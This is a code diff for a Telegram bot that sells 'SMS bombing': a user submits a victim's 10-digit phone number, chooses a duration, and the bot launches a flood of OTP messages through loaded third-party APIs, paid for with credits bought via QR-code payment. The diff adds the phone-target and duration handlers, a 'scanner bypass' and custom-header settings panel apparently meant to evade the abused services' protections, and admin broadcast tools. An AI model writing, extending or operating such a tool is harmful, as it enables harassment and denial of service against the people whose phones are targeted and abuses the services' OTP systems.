+        const isUnlimited = user.daily_unlimited > Date.now() / 1000;
         bot.sendMessage(chatId, 
-            `🤖 **BOT COMMANDS & HELP**\n\n📱 **/bomb** - Start bombing (choose duration)\n⏹️ **/stop** - Stop active bombing\n💰 **/credits** - Check your credits\n🎁 **/daily** - Daily spin wheel\n🎟️ **/redeem** - Redeem code\n🔗 **/referral** - Get referral link\n💳 **/buy** - Buy credits\n⚙️ **/settings** - Modify scanner/headers\n📊 **/stats** - View your stats\n\n💡 **Bombing Costs:**\n• 1-10 minutes: 1 credit per minute\n• 11-60 minutes: 10 credits\n• ⭐ 1 Day Unlimited: 100 coins\n\n💳 **Payment:**\n• Select plan > Scan QR > Pay > Send screenshot\n• Admin will approve within 24 hours\n\n⭐ **Referral Bonus:** 5 credits each!\n⚠️ **Anti-Spam:** Only 1 referral per minute`,
+            `📊 **Your Stats**\n👤 ID: ${chatId}\n💰 Credits: ${user.credits}\n⚔️ Attacks: ${user.total_attacks || 0}\n📈 Sessions: ${totalSessions}\n📬 OTPs Sent: ${totalSent}\n⭐ Unlimited: ${isUnlimited ? '✅ Active' : '❌ Inactive'}`,
             { parse_mode: 'Markdown' }
         );
+        return;
+    }
+
+    // ===== HELP =====
+    if (text === '❓ HELP') {
+        bot.sendMessage(chatId, 
+            `🤖 **BOT COMMANDS & HELP**\n\n📱 **/bomb** - Start bombing (choose duration)\n⏹️ **/stop** - Stop active bombing\n💰 **/credits** - Check your credits\n🎁 **/daily** - Daily spin wheel\n🎟️ **/redeem** - Redeem code\n🔗 **/referral** - Get referral link\n💳 **/buy** - Buy credits\n⚙️ **/settings** - Modify scanner/headers\n📊 **/stats** - View your stats\n\n💡 **Bombing Costs:**\n• 1-10 minutes: 1 credit per minute\n• 11-60 minutes: 10 credits\n• ⭐ 1 Day Unlimited: 100 coins\n\n💳 **Payment:**\n• Select plan > Scan QR > Pay > Send screenshot\n• Admin will approve\n\n⭐ **Referral Bonus:** 5 credits each!`,
+            { parse_mode: 'Markdown' }
+        );
+        return;
+    }
+
+    // ===== SETTINGS =====
+    if (text === '⚙️ SETTINGS') {
+        const keyboard = {
+            inline_keyboard: [
+                [{ text: '📋 View Settings', callback_data: 'settings_view' }],
+                [{ text: '🔍 Add Scanner', callback_data: 'settings_add_scanner' }],
+                [{ text: '📝 Modify Headers', callback_data: 'settings_modify_headers' }]
+            ]
+        };
+        bot.sendMessage(chatId, '⚙️ **Settings Panel**', { parse_mode: 'Markdown', reply_markup: keyboard });
         return;
     }
 
@@ -2685,21 +2428,374 @@ bot.on('message', async (msg) => {
         return;
     }
 
-    // ===== REST OF THE COMMANDS (SAME AS BEFORE) =====
-    // ... (baaki commands same rahenge)
+    if (text === '🔙 BACK') {
+        bot.sendMessage(chatId, '🔙 Back to main menu', mainKeyboard());
+        return;
+    }
+
+    // ===== ADMIN COMMANDS =====
+    if (ADMIN_IDS.includes(Number(chatId))) {
+        if (text === '📊 STATS') {
+            const totalUsers = await db.User.countDocuments();
+            const totalAttacks = (await db.User.aggregate([{ $group: { _id: null, total: { $sum: '$total_attacks' } } }]))[0]?.total || 0;
+            const totalCredits = (await db.User.aggregate([{ $group: { _id: null, total: { $sum: '$credits' } } }]))[0]?.total || 0;
+            const config = await db.getScannerConfig();
+            const channels = await db.getChannels();
+            bot.sendMessage(chatId, 
+                `📊 **BOT STATS**\n👥 Users: ${totalUsers}\n💰 Total credits: ${totalCredits}\n⚔️ Attacks: ${totalAttacks}\n📡 APIs loaded: ${uniqueApis.length}\n📺 Channels: ${channels.length}\n🛡️ Scanners: ${config.scanners.length}`,
+                { parse_mode: 'Markdown' }
+            );
+            return;
+        }
+
+        if (text === '📢 BROADCAST') {
+            const keyboard = {
+                inline_keyboard: [
+                    [{ text: '📤 Start Broadcast', callback_data: 'smart_broadcast_start' }],
+                    [{ text: '❌ Cancel', callback_data: 'smart_broadcast_cancel' }]
+                ]
+            };
+            bot.sendMessage(chatId, '📢 **Broadcast System**\n\nSend message to all users.', 
+                { parse_mode: 'Markdown', reply_markup: keyboard });
+            return;
+        }
+
+        // ... other admin commands (ban, unban, add credits, protected, etc.)
+    }
+
+    // ===== START BOMB =====
+    if (text.includes('START BOMB')) {
+        if (bombingStatus.get(chatId)) {
+            return bot.sendMessage(chatId, '❌ You already have an active bombing session. Use /stop first.');
+        }
+        if (!await db.isJoined(chatId, bot)) {
+            const channels = await db.getChannels();
+            return bot.sendMessage(chatId, `🚫 Join required channels first:\n${channels.join('\n')}`);
+        }
+        bot.sendMessage(chatId, '📱 Send the 10-digit phone number to bomb:');
+        userStates.set(chatId, { state: 'enter_phone' });
+        return;
+    }
+
+    // ===== STOP BOMB =====
+    if (text === '🔴 STOP BOMB') {
+        if (bombingStatus.get(chatId)) {
+            bombingStatus.set(chatId, false);
+            bot.sendMessage(chatId, '⏹️ Bombing stopped.');
+        } else {
+            bot.sendMessage(chatId, '❌ No active bombing.');
+        }
+        return;
+    }
+
+    // ===== STATE HANDLERS =====
+    if (userStates.has(chatId)) {
+        const state = userStates.get(chatId);
+        const input = text.trim();
+
+        // Redeem code
+        if (state.state === 'redeem_code') {
+            const amount = await db.getRedeemCode(input.toUpperCase());
+            if (amount === null) {
+                bot.sendMessage(chatId, '❌ Invalid code!');
+            } else {
+                await db.updateCredits(chatId, amount);
+                bot.sendMessage(chatId, `✅ Redeemed ${amount} credits!`);
+            }
+            userStates.delete(chatId);
+            return;
+        }
+
+        // Enter phone
+        if (state.state === 'enter_phone') {
+            const phone = input.replace(/\D/g, '');
+            if (phone.length !== 10) return bot.sendMessage(chatId, '❌ Invalid number! Must be 10 digits.');
+            userStates.set(chatId, { phone: phone });
+            const keyboard = {
+                inline_keyboard: [
+                    [{ text: '🟢 1 Min (1 coin)', callback_data: 'dur_1' }, { text: '🟢 2 Min (2 coins)', callback_data: 'dur_2' }, { text: '🟢 3 Min (3 coins)', callback_data: 'dur_3' }],
+                    [{ text: '🟢 5 Min (5 coins)', callback_data: 'dur_5' }, { text: '🟢 10 Min (10 coins)', callback_data: 'dur_10' }, { text: '🟢 30 Min (10 coins)', callback_data: 'dur_30' }],
+                    [{ text: '🟢 60 Min (10 coins)', callback_data: 'dur_60' }, { text: '⭐ 1 Day (100 coins)', callback_data: 'dur_1440' }]
+                ]
+            };
+            bot.sendMessage(chatId, `📱 Target: \`${phone}\`\n⏱️ **Select Bombing Duration:**`, 
+                { parse_mode: 'Markdown', reply_markup: keyboard });
+            return;
+        }
+
+        // Admin: Add credits
+        if (state.state === 'add_credits') {
+            const uid = parseInt(input);
+            if (isNaN(uid)) return bot.sendMessage(chatId, '❌ Invalid ID.');
+            userStates.set(chatId, { state: 'add_credits_amount', uid });
+            bot.sendMessage(chatId, '💰 Send amount to add:');
+            return;
+        }
+        if (state.state === 'add_credits_amount') {
+            const amount = parseInt(input);
+            if (isNaN(amount) || amount <= 0) return bot.sendMessage(chatId, '❌ Invalid amount.');
+            await db.updateCredits(state.uid, amount);
+            bot.sendMessage(chatId, `✅ Added ${amount} credits to ${state.uid}`);
+            userStates.delete(chatId);
+            return;
+        }
+
+        // Admin: Ban/Unban/Protected/etc.
+        // ... (add remaining admin state handlers)
+    }
 });
 
 // ============================================================
-// ===== CHANNEL BUTTONS =====
+// ===== CALLBACK QUERY HANDLER =====
 // ============================================================
 
-async function getChannelButtons() {
-    const channels = await db.getChannels();
-    const buttons = channels.map(ch => {
-        return [{ text: `✅ ${ch}`, url: `https://t.me/${ch.replace('@', '')}` }];
-    });
-    buttons.push([{ text: '🟢 I have joined all channels', callback_data: 'verify_join' }]);
-    return { inline_keyboard: buttons };
+bot.on('callback_query', async (callbackQuery) => {
+    const chatId = callbackQuery.message.chat.id;
+    const data = callbackQuery.data;
+    const msgId = callbackQuery.message.message_id;
+
+    // ===== VERIFY JOIN =====
+    if (data === 'verify_join') {
+        const joined = await db.isJoined(chatId, bot);
+        if (joined) {
+            bot.editMessageText('✅ You have joined all channels! Access granted.', { chat_id: chatId, message_id: msgId });
+            await showMainMenu(chatId);
+        } else {
+            bot.answerCallbackQuery(callbackQuery.id, { text: '❌ You still haven\'t joined all channels.', show_alert: true });
+        }
+        return;
+    }
+
+    // ===== DURATION SELECTION =====
+    if (data.startsWith('dur_')) {
+        const dur = parseInt(data.split('_')[1]);
+        const state = userStates.get(chatId);
+        if (state && state.phone) {
+            const phone = state.phone;
+            userStates.delete(chatId);
+            await runBomber(chatId, phone, dur);
+        } else {
+            bot.sendMessage(chatId, '❌ Please enter phone number first.');
+        }
+        bot.answerCallbackQuery(callbackQuery.id);
+        return;
+    }
+
+    // ===== BUY CREDITS =====
+    if (data.startsWith('buy_')) {
+        const planKey = data.replace('buy_', '');
+        await handleBuyCredits(chatId, planKey);
+        bot.answerCallbackQuery(callbackQuery.id);
+        return;
+    }
+
+    // ===== PAYMENT APPROVAL =====
+    if (data.startsWith('approve_pay_')) {
+        if (!ADMIN_IDS.includes(Number(chatId))) {
+            return bot.answerCallbackQuery(callbackQuery.id, { text: '⛔ Admin only!', show_alert: true });
+        }
+
+        const payId = data.replace('approve_pay_', '');
+        const payment = pendingScreenshots.get(payId);
+        
+        if (!payment) {
+            return bot.editMessageText('❌ Payment not found or already processed.', { chat_id: chatId, message_id: msgId });
+        }
+
+        const userId = payment.userId;
+        const credits = payment.credits;
+        
+        try {
+            if (credits > 0) {
+                await db.updateCredits(userId, credits);
+            } else {
+                const user = await db.getUser(userId);
+                user.daily_unlimited = Date.now() / 1000 + 86400;
+                await user.save();
+            }
+
+            payment.status = 'approved';
+            pendingScreenshots.set(payId, payment);
+
+            try {
+                await bot.sendMessage(userId,
+                    `🎉 **Payment Approved!**\n\n` +
+                    `✅ Your payment of ₹${payment.price} has been approved.\n` +
+                    `💰 ${credits > 0 ? `Added ${credits} credits!` : '⭐ Unlimited Plan Activated for 24 hours!'}\n\n` +
+                    `Use /bomb to start bombing!`
+                );
+            } catch (e) {}
+
+            await bot.editMessageText(
+                `✅ **Payment Approved!**\n\n` +
+                `👤 User: ${payment.first_name}\n` +
+                `💳 Plan: ${payment.plan}\n` +
+                `💰 Amount: ₹${payment.price}\n` +
+                `✅ Status: APPROVED`,
+                { chat_id: chatId, message_id: msgId }
+            );
+
+            pendingScreenshots.delete(payId);
+
+        } catch (error) {
+            bot.editMessageText(`❌ Error: ${error.message}`, { chat_id: chatId, message_id: msgId });
+        }
+
+        bot.answerCallbackQuery(callbackQuery.id, { text: '✅ Payment approved!' });
+        return;
+    }
+
+    if (data.startsWith('reject_pay_')) {
+        if (!ADMIN_IDS.includes(Number(chatId))) {
+            return bot.answerCallbackQuery(callbackQuery.id, { text: '⛔ Admin only!', show_alert: true });
+        }
+
+        const payId = data.replace('reject_pay_', '');
+        const payment = pendingScreenshots.get(payId);
+
+        if (!payment) {
+            return bot.editMessageText('❌ Payment not found.', { chat_id: chatId, message_id: msgId });
+        }
+
+        payment.status = 'rejected';
+        pendingScreenshots.set(payId, payment);
+
+        try {
+            await bot.sendMessage(payment.userId,
+                `❌ **Payment Rejected**\n\n` +
+                `Your payment of ₹${payment.price} was rejected.\n\n` +
+                `Please try again with a clear screenshot.`
+            );
+        } catch (e) {}
+
+        await bot.editMessageText(
+            `❌ **Payment Rejected**\n\n` +
+            `👤 User: ${payment.first_name}\n` +
+            `💳 Plan: ${payment.plan}\n` +
+            `💰 Amount: ₹${payment.price}\n` +
+            `❌ Status: REJECTED`,
+            { chat_id: chatId, message_id: msgId }
+        );
+
+        pendingScreenshots.delete(payId);
+        bot.answerCallbackQuery(callbackQuery.id, { text: '❌ Payment rejected' });
+        return;
+    }
+
+    // ===== SETTINGS CALLBACKS =====
+    if (data === 'settings_view') {
+        const user = await db.getUser(chatId);
+        const msgText = `📋 **Your Current Settings**\n\n🔍 Scanner: ${user.scanner_enabled ? '✅ Enabled' : '❌ Disabled'}\n🛡️ Custom Headers: ${Object.keys(user.custom_headers || {}).length} modified`;
+        bot.editMessageText(msgText, { chat_id: chatId, message_id: msgId, parse_mode: 'Markdown' });
+        bot.answerCallbackQuery(callbackQuery.id);
+        return;
+    }
+
+    if (data === 'settings_add_scanner') {
+        bot.editMessageText('🔍 **Scanner/Bypass Setup**\n\nPlease send a description or code for scanner bypass.', 
+            { chat_id: chatId, message_id: msgId });
+        userStates.set(chatId, { state: 'add_scanner_user' });
+        bot.answerCallbackQuery(callbackQuery.id);
+        return;
+    }
+
+    if (data === 'settings_modify_headers') {
+        bot.editMessageText('📝 **Modify Headers**\n\nSend header modifications in format:\n`header_name: header_value`\n\nSend /done when finished.', 
+            { chat_id: chatId, message_id: msgId });
+        userStates.set(chatId, { state: 'modify_headers', headers: {} });
+        bot.answerCallbackQuery(callbackQuery.id);
+        return;
+    }
+
+    // ===== SMART BROADCAST =====
+    if (data === 'smart_broadcast_start') {
+        if (!ADMIN_IDS.includes(Number(chatId))) {
+            return bot.answerCallbackQuery(callbackQuery.id, { text: '⛔ Admin only!', show_alert: true });
+        }
+        adminBroadcastState.set(chatId, { mode: 'broadcast', active: true });
+        bot.editMessageText(
+            `📢 **Broadcast Mode Activated**\n\nSend any message and I'll forward it to ALL users!\n\nSend /cancel to exit.`,
+            { chat_id: chatId, message_id: msgId }
+        );
+        bot.answerCallbackQuery(callbackQuery.id, { text: '✅ Broadcast mode activated!' });
+        return;
+    }
+
+    if (data === 'smart_broadcast_cancel') {
+        if (!ADMIN_IDS.includes(Number(chatId))) {
+            return bot.answerCallbackQuery(callbackQuery.id, { text: '⛔ Admin only!', show_alert: true });
+        }
+        adminBroadcastState.delete(chatId);
+        bot.editMessageText('❌ Broadcast cancelled.', { chat_id: chatId, message_id: msgId });
+        bot.answerCallbackQuery(callbackQuery.id, { text: '❌ Cancelled' });
+        return;
+    }
+});
+
+// ============================================================
+// ===== BROADCAST PROCESSING =====
+// ============================================================
+
+async function processSmartBroadcast(chatId, msg) {
+    try {
+        const users = await db.User.find().select('_id');
+        const totalUsers = users.length;
+        
+        if (totalUsers === 0) {
+            return bot.sendMessage(chatId, '❌ No users found!');
+        }
+        
+        const processingMsg = await bot.sendMessage(chatId, `⏳ Broadcasting to ${totalUsers} users...`);
+        
+        let success = 0, fail = 0, blocked = 0;
+        const startTime = Date.now();
+        
+        for (let i = 0; i < users.length; i++) {
+            const targetId = users[i]._id;
+            try {
+                await bot.forwardMessage(targetId, chatId, msg.message_id);
+                success++;
+            } catch (error) {
+                if (error.message && error.message.includes('bot was blocked')) {
+                    blocked++;
+                } else {
+                    fail++;
+                }
+            }
+            
+            if ((i + 1) % 10 === 0 || i === users.length - 1) {
+                const progress = Math.round(((i + 1) / totalUsers) * 100);
+                try {
+                    await bot.editMessageText(
+                        `📢 **Broadcasting...**\n\n` +
+                        `✅ Success: ${success}\n` +
+                        `❌ Failed: ${fail}\n` +
+                        `🚫 Blocked: ${blocked}\n` +
+                        `⏳ Progress: ${progress}%`,
+                        { chat_id: chatId, message_id: processingMsg.message_id, parse_mode: 'Markdown' }
+                    );
+                } catch (e) {}
+            }
+            
+            await new Promise(r => setTimeout(r, 50));
+        }
+        
+        const totalTime = Math.floor((Date.now() - startTime) / 1000);
+        await bot.editMessageText(
+            `✅ **Broadcast Completed!**\n\n` +
+            `📊 Total: ${totalUsers}\n` +
+            `✅ Success: ${success}\n` +
+            `❌ Failed: ${fail}\n` +
+            `🚫 Blocked: ${blocked}\n` +
+            `⏱️ Time: ${totalTime}s`,
+            { chat_id: chatId, message_id: processingMsg.message_id, parse_mode: 'Markdown' }
+        );
+        
+    } catch (error) {
+        bot.sendMessage(chatId, `❌ Broadcast failed: ${error.message}`);
+    } finally {
+        adminBroadcastState.delete(chatId);
+    }
 }
 
 // ============================================================
@@ -2763,8 +2859,6 @@ app.listen(port, '0.0.0.0', () => {
 
 console.log('🤖 Bot started successfully!');
 console.log(`✅ Loaded ${uniqueApis.length} unique APIs`);
-console.log('📢 Smart Broadcast System Loaded!');
-console.log(`⚙️ Optimized: Batch size ${BATCH_SIZE}`);
 console.log(`💰 Unlimited plan cost: 100 coins`);
 console.log(`📸 QR Code payment system enabled!`);
 console.log(`💳 Screenshot approval system enabled!`);
